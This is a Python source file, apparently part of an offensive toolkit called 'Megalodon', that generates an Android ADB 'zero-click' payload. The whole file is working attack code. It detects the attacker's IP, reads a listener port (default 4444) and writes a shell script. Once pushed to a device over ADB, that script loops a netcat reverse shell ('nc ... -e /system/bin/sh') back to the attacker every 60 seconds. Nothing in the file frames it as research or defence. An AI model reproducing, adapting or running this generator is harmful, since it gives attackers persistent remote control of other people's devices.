import json
import os
import time
from pathlib import Path

def generate():
    """Generate ADB zero-click payload"""
    output_dir = Path(__file__).parent.parent.parent / 'payloads' / 'zero_click'
    output_dir.mkdir(parents=True, exist_ok=True)
    
    # Get listener IP and port
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        listener_ip = s.getsockname()[0]
        s.close()
    except:
        listener_ip = '0.0.0.0'
    
    config_file = Path('config/megalodon.json')
    if config_file.exists():
        with open(config_file, 'r') as f:
            config = json.load(f)
            listener_port = config.get('listener', {}).get('port', 4444)
    else:
        listener_port = 4444
    
    print("[*] Generating ADB zero-click payload...")
    
    # Create shell script that runs on target
    payload_content = f'''#!/system/bin/sh
# Megalodon Zero-Click ADB Payload
# Executes automatically when pushed via ADB

# Set up reverse shell
while true; do
    nc {listener_ip} {listener_port} -e /system/bin/sh &
    sleep 60
done
'''
    
    output_file = output_dir / 'adb_payload.sh'
    with open(output_file, 'w') as f:
        f.write(payload_content)
    
    print(f"[+] ADB payload created: {output_file}")
    
    return {
        'success': True,
        'payload_file': str(output_file),
        'type': 'adb',
        'listener_ip': listener_ip,
        'listener_port': listener_port,
        'message': 'ADB zero-click payload generated'
    }
